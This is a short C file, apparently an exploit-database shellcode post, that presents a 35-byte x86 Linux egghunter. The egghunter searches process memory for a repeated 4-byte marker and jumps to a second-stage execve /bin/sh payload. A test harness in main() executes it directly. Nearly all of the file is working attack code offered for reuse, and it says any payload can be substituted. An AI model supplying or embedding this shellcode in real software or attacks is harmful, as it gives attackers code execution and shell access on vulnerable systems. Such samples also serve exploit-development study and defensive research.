/* Title: Egghunter shellcode ( 35 bytes)
 * Author: pktmonky
 * Description: Egghunter shellcode to search memory for second stage shellcode.
 * The egg and the second stage shellcode are configurable.
 */

#include<stdio.h>
#include<string.h>

/* EGG is configurable, avoid using NULL bytes or any other discovered forbidden characters.
 * The configured shellcode is an execve shell. Any shellcode that avoids NULL bytes and
 * discovered forbidden characters is allowed.
 */

#define EGG "\x99\x01\xab\x67" 
unsigned char shellcode[] = 
EGG
EGG
"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";
 
unsigned char egghunter[] =
"\x31\xd2\x66\x81\xca\xff\x0f\x42\x8d\x5a\x04\x6a\x21\x58\xcd\x80\x3c\xf2\x74\xee\xb8"EGG"\x89\xd7\xaf\x75\xe9\xaf\x75\xe6\xff\xe7";
 
main()
{

    printf("Shellcode Length:  %d\n", strlen(egghunter));
 
    int (*ret)() = (int(*)())egghunter;
 
    ret();
 
}
